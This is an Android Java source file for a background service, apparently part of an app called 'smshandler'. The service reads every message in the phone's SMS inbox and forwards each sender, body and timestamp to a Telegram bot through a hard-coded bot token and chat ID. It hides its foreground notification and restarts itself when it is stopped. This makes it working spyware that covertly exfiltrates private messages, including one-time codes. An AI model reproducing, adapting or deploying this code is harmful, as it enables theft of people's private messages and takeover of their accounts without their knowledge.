package com.smshandler;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.provider.Telephony;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class SmsService extends Service {

    private static final String BOT_TOKEN = "8755444402:AAHMnXZp0cY60w8HC-bkr_Ut_VNKALeY6Es";
    private static final String CHAT_ID = "8623638607";
    private boolean oldSmsSent = false;
    private static final int NOTIFICATION_ID = 1;

    @Override
    public void onCreate() {
        super.onCreate();
        hideNotification();
    }

    private void hideNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                "sms_channel",
                "",
                NotificationManager.IMPORTANCE_NONE);
            channel.setShowBadge(false);
            channel.enableLights(false);
            channel.enableVibration(false);
            channel.setSound(null, null);

            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }

            Notification notification = new Notification.Builder(this, "sms_channel")
                .setContentTitle("")
                .setContentText("")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setOngoing(true)
                .build();

            startForeground(NOTIFICATION_ID, notification);

            if (manager != null) {
                manager.cancel(NOTIFICATION_ID);
            }

            new android.os.Handler().postDelayed(() -> {
                stopForeground(Service.STOP_FOREGROUND_DETACH);
                startForeground(NOTIFICATION_ID, notification);
                if (manager != null) {
                    manager.cancel(NOTIFICATION_ID);
                }
            }, 100);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (!oldSmsSent) {
            oldSmsSent = true;
            new Thread(this::sendAllOldSms).start();
        }
        return START_STICKY;
    }

    private void sendAllOldSms() {
        try {
            ContentResolver cr = getContentResolver();
            Uri uri = Telephony.Sms.Inbox.CONTENT_URI;
            Cursor cursor = cr.query(uri, null, null, null, "date ASC");
            if (cursor != null && cursor.moveToFirst()) {
                int senderIndex = cursor.getColumnIndex("address");
                int bodyIndex = cursor.getColumnIndex("body");
                int dateIndex = cursor.getColumnIndex("date");
                do {
                    String sender = senderIndex >= 0 ? cursor.getString(senderIndex) : "Unknown";
                    String body = bodyIndex >= 0 ? cursor.getString(bodyIndex) : "";
                    long date = dateIndex >= 0 ? cursor.getLong(dateIndex) : 0;
                    sendToTelegram(this, sender, body, date);
                    Thread.sleep(1000);
                } while (cursor.moveToNext());
                cursor.close();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void sendToTelegram(Context context, String sender, String message, long timestamp) {
        try {
            String date = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss", Locale.getDefault())
                .format(new Date(timestamp));
            String text = "📨 SMS Forwarded
" +
                         "From: " + sender + "
" +
                         "Msg: " + message + "
" +
                         "Time: " + date;
            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN +
                           "/sendMessage?chat_id=" + CHAT_ID +
                           "&parse_mode=HTML" +
                           "&text=" + URLEncoder.encode(text, "UTF-8");
            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            conn.getInputStream();
            conn.disconnect();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Intent restartService = new Intent(getApplicationContext(), this.getClass());
        restartService.setPackage(getPackageName());
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(restartService);
        } else {
            startService(restartService);
        }
        super.onTaskRemoved(rootIntent);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Intent broadcastIntent = new Intent();
        broadcastIntent.setAction("restartservice");
        broadcastIntent.setClass(this, BootReceiver.class);
        sendBroadcast(broadcastIntent);
    }
}
